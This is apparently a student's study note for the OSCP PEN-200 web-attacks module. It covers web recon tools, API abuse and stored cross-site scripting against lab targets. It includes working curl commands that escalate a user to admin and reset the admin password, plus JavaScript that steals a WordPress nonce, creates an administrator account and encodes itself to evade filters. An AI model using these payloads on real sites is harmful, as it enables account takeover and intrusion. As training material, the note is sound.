---
title: "PWK Module 08 - Introduction to Web Application Attacks"
created: "2026-04-04"
source: "PEN-200 PWK Course (OffSec 2025) - Pages 201-244"
type: reference-note
status: active
tags:
  - oscp
  - web-attacks
  - pwk
  - reference
  - module-08
---

# Module 08 — Introduction to Web Application Attacks

> **OSCP Exam Relevance:** Web app attacks appear frequently in the PWK labs. XSS with privilege escalation, API abuse, and directory brute-forcing are all testable techniques. Master the Burp Suite workflow — you will use it constantly.

**Learning Units Covered:**
- 8.1 Web Application Assessment Methodology
- 8.2 Web Application Assessment Tools (Nmap, Wappalyzer, Gobuster, Burp Suite)
- 8.3 Web Application Enumeration (DevTools, Headers, API Testing)
- 8.4 Cross-Site Scripting (XSS)

---

## 8.1 Web Application Assessment Methodology

### Three Testing Approaches

| Type | What You Have | Best For |
|------|--------------|----------|
| **White-box** | Full source code + infrastructure access | Deep code review, longer timeline |
| **Black-box** | Zero prior knowledge | Bug bounty engagements, simulates real attacker |
| **Grey-box** | Partial info (creds, framework details) | Focused testing, most common in pentest engagements |

> 🎯 **OSCP focus:** Black-box testing. You start with just an IP — no source code.

### OWASP Top 10

The industry-standard list of the most critical web application security risks. Published by the [OWASP Foundation](https://owasp.org/www-project-top-ten/).

**Why it matters:** The PWK modules cover multiple OWASP Top 10 vulnerabilities. Understanding this framework helps you think systematically about where to look.

---

## 8.2 Web Application Assessment Tools

### 8.2.1 Nmap — Web Server Fingerprinting

**Step 1: Service version scan**
```bash
sudo nmap -p80 -sV <target-ip>
# Output: Apache httpd 2.4.41 (Ubuntu)
```

**Step 2: NSE http-enum script (directory discovery)**
```bash
sudo nmap -p80 --script=http-enum <target-ip>
# Discovers: /login.php, /uploads/, /db/, /images/, /css/, /js/
```

> 💡 **Why it works:** `http-enum` uses a built-in wordlist to probe for common directories/files. It's faster and quieter than Gobuster for initial recon — use it first.

---

### 8.2.2 Wappalyzer — Technology Stack Identification

**What it reveals:**
- Operating system
- Web server (Apache, Nginx, IIS)
- UI framework (Bootstrap, jQuery)
- JavaScript libraries and their versions
- CMS (WordPress, Drupal, Joomla)

**How to use:** [Wappalyzer website](https://www.wappalyzer.com/) → Technology Lookup → enter domain

> 💡 **OSCP tip:** Old JavaScript library versions = known CVEs. If Wappalyzer shows jQuery 1.x or an old Bootstrap, search Exploit-DB for that version.

---

### 8.2.3 Gobuster — Directory Brute Force

**Basic directory enumeration:**
```bash
gobuster dir -u http://<target-ip> -w /usr/share/wordlists/dirb/common.txt -t 5
# -t 5 = 5 threads (reduces noise, quieter)
```

**Gobuster with API pattern matching:**
```bash
# Create a pattern file:
echo "{GOBUSTER}/v1" > pattern.txt
echo "{GOBUSTER}/v2" >> pattern.txt

# Run with pattern:
gobuster dir -u http://<target-ip>:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern.txt
```

**Common wordlists:**

| Wordlist | Size | Use When |
|----------|------|----------|
| `/usr/share/wordlists/dirb/common.txt` | Small | Quick initial scan |
| `/usr/share/wordlists/dirb/big.txt` | Medium | Deeper enumeration |
| `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` | Large | Thorough scan |
| `/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt` | Large | Best coverage |

> ⚠️ **Note:** Gobuster generates a lot of traffic — not suitable when stealth is required. Use Nmap's http-enum first for quieter initial recon.

---

### 8.2.4 Burp Suite — Web App Proxy

**The core of web application testing. Learn this tool deeply.**

#### Setting Up Burp Suite

```bash
burpsuite   # Launch from terminal
```

1. Choose **Temporary project** → Next
2. Choose **Use Burp defaults** → Start Burp
3. In Firefox: `about:preferences#general` → Network Settings → Manual proxy
   - Proxy: `127.0.0.1` Port: `8080`
   - Enable for all protocols

#### Key Features

**Proxy** — Intercepts all browser traffic
- `Proxy > HTTP History` — view all requests/responses
- Toggle Intercept ON/OFF (ON = must manually forward each request)
- Right-click any request → Send to Repeater / Send to Intruder

**Repeater** — Manually craft and replay requests
- Modify any part of the request (headers, params, body)
- Send and view raw response immediately
- Useful for testing API endpoints and modifying payloads

**Intruder** — Automated attack tool
- Select payload positions in a request (mark with § §)
- Load a wordlist as payload
- Use for: password brute force, parameter fuzzing, header injection
- Community edition is rate-limited — use `hydra` or `ffuf` for speed

> 💡 **OSCP workflow:** Browse target with Burp running → review HTTP History → send interesting requests to Repeater → test modifications → escalate to Intruder if needed.

#### Burp Intruder — Password Brute Force Example

```
1. Navigate to login page in Firefox (with Burp proxy active)
2. Submit a test login (username: admin, password: test)
3. In Burp: Proxy > HTTP History → right-click POST request → Send to Intruder
4. Intruder > Positions tab → Clear all § § markers
5. Select only the password value → click Add §
6. Intruder > Payloads tab → paste wordlist values
7. Click Start Attack
8. Sort results by Status code or Response Length — the outlier = valid credentials
```

---

## 8.3 Web Application Enumeration

### 8.3.1 Debugging Page Content — Firefox DevTools

**Open DevTools:** Right-click → Inspect OR `F12`

| Tool | What it shows | OSCP Use |
|------|--------------|----------|
| **Debugger** | JavaScript source files, frameworks | Find JS library versions, hidden vars |
| **Inspector** | HTML DOM tree | Find hidden form fields, comments |
| **Console** | JS execution environment | Run JS test payloads, debug XSS |
| **Network** | All HTTP requests/responses | Inspect headers, cookies, API calls |
| **Storage** | Cookies, localStorage | Check HttpOnly/Secure flags on cookies |

**Pretty-print minified JS:** In Debugger, click the `{}` icon (Pretty print source)

> 💡 **OSCP tip:** Always inspect the page source for hidden `<input type="hidden">` fields — they often contain tokens, user IDs, or roles that can be manipulated.

---

### 8.3.2 HTTP Response Headers and Sitemaps

**Useful headers that reveal technology stack:**

| Header | What it reveals |
|--------|----------------|
| `Server` | Web server software + version |
| `X-Powered-By` | Backend language (PHP, ASP.NET) |
| `X-Aspnet-Version` | ASP.NET version |
| `x-amz-cf-id` | Amazon CloudFront CDN |
| `Set-Cookie` | Cookie flags (look for absence of HttpOnly/Secure) |

**robots.txt — find hidden directories:**
```bash
curl https://<target>/robots.txt
# Look for Disallow entries — these are the pages they don't want crawled
# = pages worth investigating
```

**sitemap.xml — enumerate all pages:**
```bash
curl https://<target>/sitemap.xml
```

---

### 8.3.3 Enumerating and Abusing APIs

REST APIs follow predictable URL patterns. Once you find one endpoint, you can enumerate adjacent ones.

**Step 1: Discover API endpoints with Gobuster**
```bash
# Create version pattern file
echo "{GOBUSTER}/v1" > pattern.txt
echo "{GOBUSTER}/v2" >> pattern.txt

gobuster dir -u http://<target>:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern.txt
# Found: /books/v1, /users/v1, /console
```

**Step 2: Enumerate API structure with curl**
```bash
# GET all users
curl -i http://<target>:5002/users/v1
# Returns: list of usernames including 'admin'

# Try extending the path
curl -i http://<target>:5002/users/v1/admin
# Returns: 405 Method Not Allowed = endpoint EXISTS, wrong HTTP method

# Check login endpoint
curl -i http://<target>:5002/users/v1/login
# Returns: 404 with "User not found" = API exists
```

**Step 3: Test for broken access control (BAPI)**
```bash
# Register new user with admin=True flag
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' \
  -H 'Content-Type: application/json' \
  http://<target>:5002/users/v1/register

# Login to get auth token
curl -d '{"password":"lab","username":"offsec"}' \
  -H 'Content-Type: application/json' \
  http://<target>:5002/users/v1/login
# Returns: JWT auth_token

# Use token to change admin password (PUT request)
curl -X 'PUT' \
  'http://<target>:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth <JWT_TOKEN>' \
  -d '{"password": "pwned"}'
```

> 🎯 **Key insight:** HTTP status codes reveal API existence:
> - `404 Not Found` + "User not found" message = API exists, just no matching record
> - `405 Method Not Allowed` = endpoint exists, try different HTTP verb (GET→POST→PUT→DELETE)
> - `200 OK` with empty body = success, look at the response carefully

**OWASP API Security Top 10 — Common API flaws:**
- **BOLA** (Broken Object Level Authorization) — access other users' data by changing IDs
- **BFLA** (Broken Function Level Authorization) — access admin functions as regular user
- **Mass Assignment** — send extra fields (like `admin: true`) that get stored

---

## 8.4 Cross-Site Scripting (XSS)

### 8.4.1 Stored vs Reflected XSS

| Type | How it works | Who it affects |
|------|-------------|---------------|
| **Stored (Persistent)** | Payload saved in database, served to all visitors | All users who load the page |
| **Reflected** | Payload in URL/request, reflected in response | Only the user who clicks the malicious link |
| **DOM-based** | Payload executed by client-side JS, never reaches server | Users who load the crafted URL |

> 🎯 **OSCP exam:** Stored XSS is higher impact — one injection affects all admin users who load the page. Look for it in comment boxes, user profiles, log viewers.

---

### 8.4.2 JavaScript DOM Basics

```javascript
// DOM = Document Object Model — the browser's representation of the HTML page
// JavaScript can read and modify any part of the DOM

// Basic function syntax
function multiplyValues(x, y) {
  return x * y;
}
let a = multiplyValues(3, 5)
console.log(a)  // outputs: 15 in browser console

// XSS payload building blocks:
document.cookie              // read cookies (if not HttpOnly)
document.location            // current URL
window.location.href         // redirect user
new XMLHttpRequest()         // make HTTP requests from victim's browser
```

---

### 8.4.3 Identifying XSS Vulnerabilities

**Special characters to inject (test each in input fields):**
```
< > ' " { } ;
```

**Why these matter:**
- `<` `>` — HTML element tags
- `{` `}` — JavaScript function declarations
- `'` `"` — String delimiters
- `;` — Statement terminator

**Testing workflow:**
1. Find all input fields (search boxes, comments, profile fields, headers)
2. Submit special chars and observe if they appear **unencoded** in the response
3. If `<script>` appears as `<script>` (not `&lt;script&gt;`) → vulnerable
4. Try `<script>alert(1)</script>` as proof of concept

---

### 8.4.4 Basic XSS — Stored via HTTP Header

**Scenario:** WordPress Visitors plugin logs User-Agent without sanitization

```bash
# Inject XSS payload via curl User-Agent header
curl -i http://offsecwp \
  --user-agent "<script>alert(42)</script>" \
  --proxy 127.0.0.1:8080

# When admin loads the Visitors plugin dashboard → alert(42) pops up
```

**Burp Repeater method:**
1. Browse to target with Burp proxy active
2. `Proxy > HTTP History` → right-click request → Send to Repeater
3. In Repeater: modify `User-Agent` header to `<script>alert(42)</script>`
4. Click Send → verify 200 OK
5. Log into admin panel and load the plugin dashboard

---

### 8.4.5 Privilege Escalation via XSS

**Attack goal:** Use stored XSS to create a new WordPress admin account

**Why it works:** Admin loads the infected page → JS executes in admin's browser → JS has admin session context → can perform admin actions (create users, etc.)

**Step 1: Check cookie flags (can we steal the session?)**
```
Firefox DevTools > Storage tab > Cookies
Look for: HttpOnly flag on session cookies
```
If `HttpOnly` = true → can't steal cookies via JS → need a different approach

**Step 2: Fetch the CSRF nonce (WordPress anti-CSRF token)**
```javascript
// This JS runs in the admin's browser
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

**Step 3: Create new admin user using the nonce**
```javascript
var params = "action=createuser&_wpnonce_create-user=" + nonce +
  "&user_login=attacker&email=attacker@offsec.com" +
  "&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

**Step 4: Encode the payload to bypass filters**
```javascript
// Minify JS first (jscompress.com), then encode as char codes:
function encode_to_javascript(string) {
    var output = '';
    for (pos = 0; pos < string.length; pos++) {
        output += string.charCodeAt(pos);
        if (pos != (string.length - 1)) { output += ","; }
    }
    return output;
}
let encoded = encode_to_javascript('your_minified_js_here')
console.log(encoded)  // run in browser console → copy output
```

**Step 5: Deliver encoded payload via curl**
```bash
curl -i http://offsecwp \
  --user-agent "<script>eval(String.fromCharCode(ENCODED_PAYLOAD))</script>" \
  --proxy 127.0.0.1:8080
```

**Step 6: Trigger the payload**
- Log into WordPress admin panel
- Navigate to Visitors plugin dashboard
- Admin loading the page = JS executes = new admin account created
- Verify: WordPress Admin → Users → check for 'attacker' account

> 🎯 **OSCP exam chain:** XSS → admin account creation → WordPress admin panel access → malicious plugin upload → web shell → RCE → system shell

---

## 8.5 Module Summary

**What you learned:**
- Three types of web app testing: white/black/grey-box
- Tool chain: Nmap → Wappalyzer → Gobuster → Burp Suite
- Enumeration: DevTools, response headers, robots.txt, sitemap.xml
- API testing: discover endpoints, test HTTP methods, look for BFLA/mass assignment
- XSS: stored vs reflected, identify with special chars, escalate with DOM manipulation

**Key OSCP mindset:** Every input field is a potential injection point. Every HTTP response header reveals technology. Every API endpoint is a potential access control bypass.

---

## Quick Reference Commands

```bash
# Web server fingerprint
sudo nmap -p80 -sV <ip>
sudo nmap -p80 --script=http-enum <ip>

# Directory brute force
gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/common.txt -t 10

# API enumeration
gobuster dir -u http://<ip>:PORT -w /usr/share/wordlists/dirb/big.txt -p pattern.txt

# Fetch robots.txt and sitemap
curl http://<ip>/robots.txt
curl http://<ip>/sitemap.xml

# API testing with curl
curl -i http://<ip>:PORT/api/v1/users
curl -d '{"key":"value"}' -H 'Content-Type: application/json' http://<ip>:PORT/api/v1/login
curl -X PUT http://<ip>:PORT/api/v1/users/admin/password -H 'Authorization: OAuth <token>' -d '{"password":"new"}'

# XSS test payload
<script>alert(1)</script>
# User-Agent XSS injection
curl -i http://<target> --user-agent "<script>alert(1)</script>"
```

---

## Links

- [[OSCP-Certification-Sprint]] — parent project
- [[PWK-Module-09-Common-Web-App-Attacks]] — next module (Directory Traversal, File Inclusion, Command Injection)
- [[XSS-Attack-Cheatsheet]] — standalone XSS reference
- [[Burp-Suite-Workflow]] — detailed Burp usage guide

## External Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [HackTricks - XSS](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
- [HackTricks - API Attacks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/api-pentesting)
- [PayloadsAllTheThings - XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)
- [PortSwigger Web Security Academy - XSS](https://portswigger.net/web-security/cross-site-scripting)
- [IppSec - Web App Videos](https://www.youtube.com/@ippsec) — search "XSS", "API", "Gobuster"
